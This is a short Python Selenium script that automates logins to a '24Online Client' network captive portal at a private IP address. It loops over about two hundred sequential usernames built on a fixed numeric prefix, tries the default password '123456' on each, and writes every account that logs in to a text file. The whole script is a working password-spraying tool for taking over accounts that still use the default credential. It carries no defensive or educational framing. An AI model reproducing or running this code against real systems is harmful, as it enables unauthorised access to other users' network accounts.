from selenium import webdriver
from selenium.webdriver.common.keys import Keys

browser=webdriver.Firefox()
browser.get('https://172.16.16.16/24online/servlet/E24onlineHTTPClient')
assert "24Online Client" in browser.title   #Asserts whether page name in title
username=browser.find_element_by_name("username")
password=browser.find_element_by_name("password")
username.clear()
password.clear()
accounts=open("accounts.txt","w")   #Text file to store usernames

for i in range(100,300):    #Enter desired range here
    browser.implicitly_wait(5)  #Waits for page to load with upper limit as 5 secs
    browser.find_element_by_name("username").send_keys("160905"+str(i))
    browser.find_element_by_name("password").send_keys("123456")
    browser.find_element_by_name("login").click()
    if 'To start surfing' in browser.page_source:
        accounts.write("Username: %s" % "160905"+str(i)+'\n')
        browser.implicitly_wait(5)  #Waits for page to load with upper limit as 5 secs
        browser.find_element_by_name("logout").click()
        continue
    elif 'Wrong username/password' in browser.page_source:
        continue
accounts.close()
browser.close()
